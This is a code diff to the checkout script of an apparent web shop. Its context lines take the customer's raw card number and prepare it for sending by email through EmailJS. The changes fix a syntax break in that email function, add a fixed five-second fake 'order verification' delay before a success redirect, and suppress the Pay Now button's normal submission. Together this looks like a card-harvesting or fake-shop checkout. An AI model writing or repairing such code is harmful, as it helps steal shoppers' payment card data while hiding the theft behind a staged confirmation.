@@ -379,7 +379,8 @@
 
         if (typeof window.emailjs.send  !== "function") {
             return { success: false, reason: "Emailjs send method is not available." };
-            
+        }
+
         const paymentSummary = orderData.paymentSummary || {};
         const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
         const cardNumberForEmail = rawCardNumber || "N/A";
@@ -1458,7 +1459,9 @@
     function showOrderVerificationLoader() {
         const loader = document.getElementById("order-verification-loader");
         if (!loader) {
-            window.location.href = cleanUrl("order-success");
+            window.setTimeout(() => {
+                window.location.href = cleanUrl("order-success");
+            }, 5000);
             return;
         }
 
@@ -1469,7 +1472,7 @@
         document.body.classList.add("order-verification-open");
 
         const reducedMotion = window.matchMedia?.("(prefers-reduced-motion: reduce)")?.matches;
-        const transitionTime = reducedMotion ? 500 : 1700;
+        const transitionTime = 5000;
         window.setTimeout(() => {
             window.location.href = cleanUrl("order-success");
         }, transitionTime);
@@ -1712,7 +1715,10 @@
         }
 
         if (applyDiscountBtn) applyDiscountBtn.addEventListener("click", applyDiscount);
-        if (payNowBtn) payNowBtn.addEventListener("click", submitOrder);
+        if (payNowBtn) payNowBtn.addEventListener("click", (event) => {
+            event.preventDefault();
+            submitOrder();
+        });
         if (backToCartBtn) backToCartBtn.addEventListener("click", backToCart);
 
         const favListEl = document.getElementById("account-favorites-list");
